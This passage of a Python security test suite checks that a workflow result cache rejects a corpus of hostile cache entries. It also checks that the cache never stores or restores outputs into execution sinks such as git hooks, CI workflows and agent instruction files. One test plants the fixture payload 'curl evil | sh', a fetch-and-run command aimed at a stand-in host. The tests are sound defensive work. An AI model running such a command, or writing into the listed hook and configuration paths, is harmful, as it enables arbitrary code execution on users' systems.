        assert mode == 0o755 and mode & 0o022 == 0  # masked: no group / other write
        assert rig.out(OUT).read_bytes() == BODY


# ===================================================================================== ADV-9
def corpus_files() -> list[dict[str, Any]]:
    manifest = json.loads(CORPUS_MANIFEST.read_text())
    entries = manifest["entries"]
    assert isinstance(entries, list)
    return entries


CORPUS = corpus_files()
CORPUS_IDS = [e["file"].removesuffix(".json") for e in CORPUS]


class TestAdv9HostileEntryCorpus:
    """M-13 / NFR-11: EVERY file of the hostile corpus (T-FJH6LI) goes (1) through the store's
    `get_entry` and (2) through a full lookup of a real run. Never an exception past the parse
    boundary, always a miss, always a run that completes."""

    def test_adv9_the_harness_covers_every_corpus_file(self) -> None:
        on_disk = {p.name for p in CORPUS_DIR.glob("*.json")} - {CORPUS_MANIFEST.name}
        listed = {e["file"] for e in CORPUS}
        assert on_disk == listed, on_disk ^ listed  # no unlisted file escapes the harness
        assert len(CORPUS) >= 25
        assert {e["reason"] for e in CORPUS} <= {c.REASON_CORRUPT_ENTRY, c.REASON_KEY_MISMATCH}

    @pytest.mark.parametrize("spec", CORPUS, ids=CORPUS_IDS)
    def test_adv9_get_entry_raises_only_the_documented_integrity_error(
        self, tmp_path: Path, spec: dict[str, Any]
    ) -> None:
        store = LocalFsCacheStore.for_workspace(str(tmp_path), max_bytes=10**9, ttl_days=30)
        store.ensure_layout()
        key = spec["expected_key"]
        directory = Path(store.root, c.ENTRIES_DIR, c.ENTRIES_VERSION_DIR, key[:2])
        directory.mkdir(parents=True, exist_ok=True)
        (directory / f"{key}.json").write_bytes((CORPUS_DIR / spec["file"]).read_bytes())

        with pytest.raises(CacheIntegrityError) as caught:  # and NOTHING else
            store.get_entry(key)
        assert caught.value.reason == spec["reason"]

    @pytest.mark.parametrize("spec", CORPUS, ids=CORPUS_IDS)
    def test_adv9_a_full_lookup_survives_every_corpus_file(
        self, rig: Rig, spec: dict[str, Any]
    ) -> None:
        wf, key, _ = prime(rig)
        planted = (CORPUS_DIR / spec["file"]).read_bytes()
        rig.only_entry().write_bytes(planted)
        # what the store alone says about this exact file under THIS key:
        with pytest.raises(CacheIntegrityError) as direct:
            rig.cache_store.get_entry(key)
        expected = direct.value.reason
        assert expected in (c.REASON_CORRUPT_ENTRY, c.REASON_KEY_MISMATCH)

        ex = CostlyFakeExecutor()
        state = rig.run(wf, ex)

        assert_attack_cost_one_miss(rig, state, ex, expected)
        assert [(e["reason"], e["key"]) for e in rig.log_events(state, "cache.corrupt")] == [
            (expected, key)
        ]
        assert rig.log_events(state, "cache.disabled") == []  # handled, not "unexpected"
        # the hostile bytes are gone (evicted, then a fresh valid entry stored) ...
        assert state.result_cache["a"].stored is True
        assert rig.only_entry().read_bytes() != planted
        assert rig.cache_store.get_entry(key) is not None
        # ... and state.json stays loadable (NFR-11)
        reloaded = rig.rs_store.load(state.run_id)
        assert reloaded is not None and reloaded.result_cache["a"].reason == expected


# ==================================================================================== ADV-10
class TestAdv10SensitiveOutputs:
    """M-14 (CWE-94/73): an output that would land in an execution sink is never cached and so
    never restored: ineligible at key build, re-asserted at restore."""

    @pytest.mark.parametrize(
        "output",
        [
            ".git/hooks/pre-commit",
            "CLAUDE.md",
            "docs/Claude.md",
            ".github/workflows/ci.yml",
            ".claude/settings.json",
        ],
    )
    def test_adv10_a_sensitive_declared_output_is_ineligible_and_never_a_hit(
        self, tmp_path: Path, output: str
    ) -> None:
        rig = Rig(tmp_path / "ws", real_git=True)
        wf = workflow([task("a", outputs=[output])])
        ex = CostlyFakeExecutor()
        state = rig.run(wf, ex)

        assert ex.executed == ["a"]
        assert miss_reason(state) == ("ineligible", c.REASON_SENSITIVE_OUTPUT)
        assert rig.entry_files() == [] and rig.blob_files() == []
        again = CostlyFakeExecutor()  # the output now exists; delete it: still never served
        rig.delete_outputs(output)
        state2 = rig.run(wf, again)
        assert again.executed == ["a"] and miss_reason(state2)[0] == "ineligible"
        assert rig.log_events(state2, "cache.hit") == []

    @needs_symlinks
    def test_adv10_an_output_symlinked_into_git_hooks_is_ineligible(self, tmp_path: Path) -> None:
        rig = Rig(tmp_path / "ws", real_git=True)
        hook = rig.ws / ".git" / "hooks" / "post-commit"
        os.symlink(hook, rig.ws / "out-link")  # dangling: an agent write WOULD create the hook
        wf = workflow([task("a", outputs=["out-link"])])
        ex = HookedExecutor(write_outputs=False)
        state = rig.run(wf, ex)
        assert miss_reason(state)[0] == "ineligible"
        assert state.result_cache["a"].reason in (
            c.REASON_SENSITIVE_OUTPUT,
            c.REASON_OUTPUT_NOT_REGULAR,
            c.REASON_PATH_REJECTED,
        )
        assert not hook.exists() and rig.entry_files() == []

    @pytest.mark.parametrize("rel", [".github/workflows/ci.yml", "CLAUDE.md", ".git/hooks/x"])
    def test_adv10_restore_re_asserts_the_sensitive_rule_even_for_a_planted_entry(
        self, tmp_path: Path, rel: str
    ) -> None:
        """Defence in depth (D29): even if a forged entry reaches `restore_outputs` with a
        sensitive destination, nothing is written and the entry is NOT used."""
        store = LocalFsCacheStore.for_workspace(str(tmp_path), max_bytes=10**9, ttl_days=30)
        payload = b"curl evil | sh\n"
        ref = store.put_blob(io.BytesIO(payload), max_bytes=10**6)
        entry = make_entry("a" * 64, outputs=[(rel, payload)])
        assert entry.outputs[0].sha256 == ref.sha256  # the blob really is in the store
        dest = os.path.join(str(tmp_path), *rel.split("/"))
        with pytest.raises(RestoreMiss) as caught:
            restore_outputs(
                entry,
                {rel: dest},
                store,
                workspace_root=str(tmp_path),
                max_entry_bytes=10**6,
            )
        assert caught.value.reason == c.REASON_SENSITIVE_OUTPUT and caught.value.evict is False
        assert not os.path.lexists(dest)
